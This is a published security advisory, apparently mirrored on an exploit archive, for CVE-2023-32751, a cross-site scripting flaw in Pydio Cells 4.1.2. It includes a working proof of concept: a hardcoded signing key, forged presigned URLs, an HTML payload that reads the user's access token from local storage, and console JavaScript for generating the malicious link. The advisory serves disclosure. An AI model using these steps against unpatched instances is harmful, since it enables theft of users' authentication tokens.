@@ -1,0 +1,203 @@
+id: 38748
+date: 05/31/2023
+title: Pydio Cells 4.1.2 - Cross-Site Scripting via File Download Vulnerability
+author: RedTeam
+cves: CVE-2023-32751
+
+Exploit Title: Pydio Cells 4.1.2 - Cross-Site Scripting (XSS) via File Download
+Affected Versions: 4.1.2 and earlier versions
+Fixed Versions: 4.2.0, 4.1.3, 3.0.12
+Vulnerability Type: Cross-Site Scripting
+Security Risk: high
+Vendor URL: https://pydio.com/
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-004
+Advisory Status: published
+CVE: CVE-2023-32751
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32751
+
+
+Introduction
+============
+
+"Pydio Cells is an open-core, self-hosted Document Sharing and
+Collaboration platform (DSC) specifically designed for organizations
+that need advanced document sharing and collaboration without security
+trade-offs or compliance issues."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+When a file named "xss.html" is downloaded in the Pydio Cells web application, a
+download URL similar to the following is generated:
+
+https://example.com/io/xss/xss.html
+  ?AWSAccessKeyId=gateway
+  &Expires=1682495748
+  &Signature=920JV0Zy%2BrNYXjak7xksAxRpRp8%3D
+  &response-content-disposition=attachment%3B%20filename%3Dxss.html
+  &pydio_jwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[...]
+
+The URL is akin to a presigned URL as used by the Amazon S3 service. It
+contains the URL parameter "response-content-disposition" which is set
+to "attachment" causing the response to contain a "Content-Disposition"
+header with that value. Therefore, the browser downloads the file
+instead of interpreting it. The URL also contains a signature and expiry
+timestamp, which are checked by the backend. Unlike a presigned URL as used
+by S3, the URL also contains the parameter "pydio_jwt" with the JWT of
+the user for authentication. Furthermore, the access key with the ID
+"gateway" is referenced, which can be found in the JavaScript sources of
+Pydio Cells together with the secret:
+
+------------------------------------------------------------------------
+_awsSdk.default.config.update({
+  accessKeyId: 'gateway',
+  secretAccessKey: 'gatewaysecret',
+  s3ForcePathStyle: !0,
+  httpOptions: {
+    timeout: PydioApi.getMultipartUploadTimeout()
+  }
+});
+------------------------------------------------------------------------
+
+With this information it is possible to change the URL parameter
+"response-content-disposition" to the value "inline" and then calculate
+a valid signature for the resulting URL. Furthermore, the content type of
+the response can be changed to "text/html" by also adding the URL
+parameter "response-content-type" with that value. This would result in
+a URL like the following for the previously shown example URL:
+
+https://example.com/io/xss/xss.html?
+  AWSAccessKeyId=gateway
+  &Expires=1682495668
+  &Signature=HpKue0YQZrnp%2B665Jf1t7ONgfRg%3D
+  &response-content-disposition=inline
+  &response-content-type=text%2Fhtml
+  &pydio_jwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[...]
+
+Upon opening the URL in a browser, the HTML included in the file is
+interpreted and any JavaScript code is run.
+
+Proof of Concept
+================
+
+Upload a HTML file into an arbitrary location of a Pydio Cells instance.
+For example with the following contents:
+
+------------------------------------------------------------------------
+<html>
+  <body>
+    <h1>Cross-Site Scriping</h1>
+    <script>
+      let token = JSON.parse(localStorage.token4).AccessToken;
+      alert(token);
+    </script>
+  </body>
+</html>
+------------------------------------------------------------------------
+
+The contained JavaScript code reads the JWT access token for Pydio Cells
+from the browser's local storage object and opens a message box. Instead
+of just displaying the JWT, it could also be sent to an attacker. The
+following JavaScript function can then be run within the browser's
+developer console to generate a presigned URL for the HTML file:
+
+------------------------------------------------------------------------
+async function getPresignedURL(path) {
+  let client = PydioApi.getClient();
+  let node = new AjxpNode(path);
+  let metadata = {Bucket: "io", ResponseContentDisposition: "inline", Key: path, ResponseContentType: "text/html"};
+  let url = await client.buildPresignedGetUrl(node, null, "text/html", metadata);
+
+  return url;
+}
+
+await getPresignedURL("xss/xss.html");
+------------------------------------------------------------------------
+
+The code has to be run in context of Pydio Cells while being logged in.
+If the resulting URL is opened in a browser, the JavaScript code
+contained in the HTML file is run. If the attack is conducted in the
+described way, the JWT of the attacker is exposed through the URL.
+However, this can be circumvented by first generating a public URL
+for the file and then constructing the presigned URL based on the
+resulting download URL.
+
+
+Workaround
+==========
+
+No workaround known.
+
+
+Fix
+===
+
+Upgrade Pydio Cells to a version without the vulnerability.
+
+
+Security Risk
+=============
+
+Attackers that can upload files to a Pydio Cells instance can construct
+URLs that execute arbitrary JavaScript code in context of Pydio Cells
+upon opening. This could for example be used to steal the authentication
+tokens of users opening the URL. It is likely that such an attack
+succeeds, since sharing URLs to files hosted using Pydio Cells is a
+common use case of the application. Therefore, the vulnerability is
+estimated to pose a high risk.
+
+
+Timeline
+========
+
+2023-03-23 Vulnerability identified
+2023-05-02 Customer approved disclosure to vendor
+2023-05-02 Vendor notified
+2023-05-03 CVE ID requested
+2023-05-08 Vendor released fixed version
+2023-05-14 CVE ID assigned
+2023-05-16 Vendor asks for a few more days before the advisory is released
+2023-05-30 Advisory released
+
+
+References
+==========
+
+[1] https://aws.amazon.com/sdk-for-javascript/
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://jobs.redteam-pentesting.de/
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Alter Posthof 1                           Fax : +49 241 510081-99
+52062 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
+
+#  0day.today [2023-06-08]  #
